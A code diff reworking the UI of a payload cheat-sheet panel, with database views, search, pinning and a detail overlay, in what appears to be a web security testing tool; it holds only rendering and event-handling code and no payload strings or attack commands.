+            <input type="search" class="cheat-search" id="cheatGlobalSearch" placeholder="Global search across all databases…" value="${escapeHtml(q)}" spellcheck="false" />
+          </div>
+          <div class="cheat-section">
+            <div class="cheat-section-title">Pinned <span class="cheat-count">${pinnedRefs.length}</span></div>
+            <div class="cheat-pin-list" id="cheatPinList">
+              ${pinnedRefs.length ? pinnedRefs.map((r) => cheatItemRow(r, true)).join('') : '<div class="cheat-empty">No pins yet — open any function and pin it.</div>'}
+            </div>
+          </div>
+          ${q ? `
+          <div class="cheat-section">
+            <div class="cheat-section-title">Search results <span class="cheat-count">${globalHits.length}</span></div>
+            <div class="cheat-item-list">
+              ${globalHits.length ? globalHits.map((r) => cheatItemRow(r, true)).join('') : '<div class="cheat-empty">No matches.</div>'}
+            </div>
+          </div>` : `
+          <div class="cheat-section">
+            <div class="cheat-section-title">Databases</div>
+            <div class="cheat-db-grid">
+              ${CHEAT_DBS.map((db) => {
+                const n = db.categories.reduce((a, c) => a + c.items.length, 0);
+                return `<button type="button" class="cheat-db-card tag-${db.tag}" data-db="${db.id}">
+                  <strong>${escapeHtml(db.name)}</strong>
+                  <small>${escapeHtml(db.blurb)}</small>
+                  <span class="cheat-count">${n} entries</span>
+                </button>`;
+              }).join('')}
+            </div>
+          </div>`}
+        </div>
+        <div class="cheat-detail-overlay hidden" id="cheatDetailOverlay"></div>`;
+
+      bindCheatHomeEvents();
+    }
+
+    function paintCheatDbView() {
+      const db = CHEAT_DBS.find((d) => d.id === cheatNav.dbId);
+      if (!db) { cheatNav.view = 'home'; paintCheatHomeView(); return; }
+      const q = cheatNav.q || '';
+      const cats = db.categories.map((cat) => {
+        const items = cat.items.filter((item) => cheatMatchesQuery({ db, cat, item }, q));
+        if (!items.length) return '';
+        return `<div class="cheat-category">
+          <div class="cheat-category-title"><span class="chevron">▼</span> ${escapeHtml(cat.title)} <span class="cheat-count">${items.length}</span></div>
+          <div class="cheat-items">
+            ${items.map((item) => cheatItemRow({ db, cat, item }, false)).join('')}
+          </div>
+        </div>`;
+      }).join('');
+
+      cheatSheetBody.innerHTML = `
+        <div class="cheat-view cheat-db-view">
+          <div class="cheat-nav-row">
+            <button type="button" class="btn btn-sm btn-ghost" id="cheatBackHome">← All DBs</button>
+            <span class="cheat-db-tag tag-${db.tag}">${escapeHtml(db.name)}</span>
+          </div>
+          <div class="cheat-search-row">
+            <input type="search" class="cheat-search" id="cheatDbSearch" placeholder="Search in ${escapeHtml(db.name)}…" value="${escapeHtml(q)}" spellcheck="false" />
+          </div>
+          <div class="cheat-item-list">${cats || '<div class="cheat-empty">No matches in this database.</div>'}</div>
+        </div>
+        <div class="cheat-detail-overlay hidden" id="cheatDetailOverlay"></div>`;
+
+      const back = $('#cheatBackHome');
+      if (back) back.addEventListener('click', () => {
+        cheatNav.view = 'home';
+        cheatNav.dbId = null;
+        cheatNav.q = '';
+        cheatNav.detailId = null;
+        paintCheatSheet();
+      });
+      const search = $('#cheatDbSearch');
+      if (search) {
+        search.addEventListener('input', () => {
+          cheatNav.q = search.value;
+          paintCheatDbView();
+          const again = $('#cheatDbSearch');
+          if (again) { again.focus(); again.setSelectionRange(again.value.length, again.value.length); }
+        });
+      }
+      cheatSheetBody.querySelectorAll('.cheat-category-title').forEach((el) => {
+        el.addEventListener('click', () => el.parentElement.classList.toggle('collapsed'));
+      });
+      bindCheatItemClicks();
+    }
+
+    function cheatItemRow(ref, showDb) {
+      const { db, item } = ref;
+      const pinned = isCheatPinned(item.id);
+      return `<div class="cheat-entry${pinned ? ' is-pinned' : ''}" data-id="${escapeHtml(item.id)}">
+        <div class="cheat-entry-main">
+          ${showDb ? `<span class="cheat-db-tag tag-${db.tag}">${escapeHtml(db.name)}</span>` : ''}
+          <code class="cheat-entry-name">${escapeHtml(item.name)}</code>
+          <span class="cheat-entry-sum">${escapeHtml(item.summary || '')}</span>
+        </div>
+        <button type="button" class="cheat-pin-mini${pinned ? ' on' : ''}" data-pin="${escapeHtml(item.id)}" title="Pin">${pinned ? '📌' : '📍'}</button>
+      </div>`;
+    }
+
+    function bindCheatHomeEvents() {
+      const search = $('#cheatGlobalSearch');
+      if (search) {
+        search.addEventListener('input', () => {
+          cheatNav.q = search.value;
+          paintCheatHomeView();
+          const again = $('#cheatGlobalSearch');
+          if (again) { again.focus(); again.setSelectionRange(again.value.length, again.value.length); }
+        });
+      }
+      cheatSheetBody.querySelectorAll('.cheat-db-card').forEach((btn) => {
+        btn.addEventListener('click', () => {
+          cheatNav.view = 'db';
+          cheatNav.dbId = btn.dataset.db;
+          cheatNav.q = '';
+          cheatNav.detailId = null;
+          paintCheatSheet();
+        });
+      });
+      bindCheatItemClicks();
+    }
+
+    function bindCheatItemClicks() {
+      cheatSheetBody.querySelectorAll('.cheat-entry').forEach((el) => {
+        el.addEventListener('click', (e) => {
+          if (e.target.closest('[data-pin]')) return;
+          cheatNav.detailId = el.dataset.id;
+          paintCheatDetail(el.dataset.id);
+        });
+      });
+      cheatSheetBody.querySelectorAll('[data-pin]').forEach((btn) => {
+        btn.addEventListener('click', (e) => {
+          e.stopPropagation();
+          const on = toggleCheatPin(btn.dataset.pin);
+          showToast(on ? 'Pinned' : 'Unpinned', 'success');
+          paintCheatSheet();
+        });
+      });
+    }
+
+    function paintCheatDetail(id) {
+      const ref = findCheatItem(id);
+      let ov = $('#cheatDetailOverlay');
+      if (!ov) {
+        ov = document.createElement('div');
+        ov.id = 'cheatDetailOverlay';
+        ov.className = 'cheat-detail-overlay';
+        cheatSheetBody.appendChild(ov);
+      }
+      if (!ref) { ov.classList.add('hidden'); return; }
+      const { db, cat, item } = ref;
+      const pinned = isCheatPinned(item.id);
+      const payloads = item.payloads || [];
+      ov.classList.remove('hidden');
+      ov.innerHTML = `
+        <div class="cheat-detail-card">
+          <div class="cheat-detail-head">
+            <button type="button" class="btn btn-sm btn-ghost" id="cheatDetailClose">← Back</button>
+            <span class="cheat-db-tag tag-${db.tag}">${escapeHtml(db.name)}</span>
+            <button type="button" class="pin-btn${pinned ? ' active' : ''}" id="cheatDetailPin">${pinned ? 'Pinned' : 'Pin'}</button>
+          </div>
+          <h3 class="cheat-detail-title"><code>${escapeHtml(item.name)}</code></h3>
+          <div class="cheat-detail-sub">${escapeHtml(cat.title)} · ${escapeHtml(item.summary || '')}</div>
+          ${item.description ? `<p class="cheat-detail-desc">${escapeHtml(item.description)}</p>` : ''}
+          ${item.example ? `<div class="cheat-detail-block"><div class="cheat-detail-label">Example</div><pre class="cheat-pre">${escapeHtml(item.example)}</pre></div>` : ''}
+          <div class="cheat-detail-block">
+            <div class="cheat-detail-label">Payloads <span class="cheat-count">${payloads.length}</span></div>
+            <div class="cheat-payload-list">
+              ${payloads.map((p, i) => `
+                <div class="cheat-payload-row">
+                  <code>${escapeHtml(p)}</code>
+                  <button type="button" class="btn btn-sm" data-insert="${i}">Insert</button>
+                </div>`).join('') || '<div class="cheat-empty">No sample payloads.</div>'}
+            </div>
+          </div>
+          ${(item.tags && item.tags.length) ? `<div class="cheat-tags">${item.tags.map((t) => `<span class="cheat-tag">${escapeHtml(t)}</span>`).join('')}</div>` : ''}
+        </div>`;
+      const close = $('#cheatDetailClose');
+      if (close) close.addEventListener('click', () => {
+        cheatNav.detailId = null;
+        ov.classList.add('hidden');
+      });
+      const pinBtn = $('#cheatDetailPin');
+      if (pinBtn) pinBtn.addEventListener('click', () => {
+        const on = toggleCheatPin(item.id);
+        showToast(on ? 'Pinned — saved' : 'Unpinned', 'success');
+        paintCheatSheet();
+        if (cheatNav.detailId) paintCheatDetail(cheatNav.detailId);
+      });
+      ov.querySelectorAll('[data-insert]').forEach((btn) => {
+        btn.addEventListener('click', () => {
+          const p = payloads[+btn.dataset.insert];
+          if (p) insertCheatPayload(p);
+        });
+      });
+    }
 
     // ===== Helpers =====
     function escapeHtml(str) {
@@ -767,43 +1170,6 @@ h1{margin-top:0;color:#1a1a2e}.badge{display:inline-block;background:#e8f5e9;col
           showToast('Appearance reset', 'success');
         });
       }
-    }
-
-    // ===== Cheat Sheet =====
-    function renderCheatSheet() {
-      cheatSheetBody.innerHTML = '';
-      CHEAT_SHEET.forEach((cat, catIdx) => {
-        const section = document.createElement('div');
-        section.className = 'cheat-category';
-        const tagClass = `tag-${cat.tag}`;
-        section.innerHTML = `
-          <div class="cheat-category-title" data-cat="${catIdx}">
-            <span class="chevron">▼</span>
-            ${cat.title}
-            <span class="cheat-db-tag ${tagClass}">${cat.tag === 'generic' ? 'ALL' : cat.tag.toUpperCase()}</span>
-          </div>
-          <div class="cheat-items">
-            ${cat.items.map((item) => `
-              <div class="cheat-item" data-payload="${escapeHtml(item.p)}" title="Click to insert">
-                ${item.db ? `<span class="db-badge tag-${cat.tag}">${item.db}</span>` : ''}
-                ${escapeHtml(item.p)}
-              </div>
-            `).join('')}
-          </div>`;
-        cheatSheetBody.appendChild(section);
-      });
-
-      cheatSheetBody.querySelectorAll('.cheat-category-title').forEach((el) => {
-        el.addEventListener('click', () => el.parentElement.classList.toggle('collapsed'));
-      });
-      cheatSheetBody.querySelectorAll('.cheat-item').forEach((el) => {
-        el.addEventListener('click', () => {
-          payloadInput.value = el.dataset.payload;
-          updatePayloadSummary();
-          openVPanel('payload');
-          showToast('Payload inserted', 'success');
-        });
-      });
     }
 
     // ===== Payload Utils =====
@@ -5092,6 +5458,13 @@ img, video, canvas { opacity: 0.9; }
         updateProxyToolbar();
       }
       if (toolName === 'cheatsheet' && typeof renderCheatSheet === 'function') {
+        if (typeof cheatNav !== 'undefined') {
+          cheatNav.view = 'home';
+          cheatNav.dbId = null;
+          cheatNav.q = '';
+          cheatNav.detailId = null;
+          cheatNav._ready = true;
+        }
         renderCheatSheet();
       }
     }
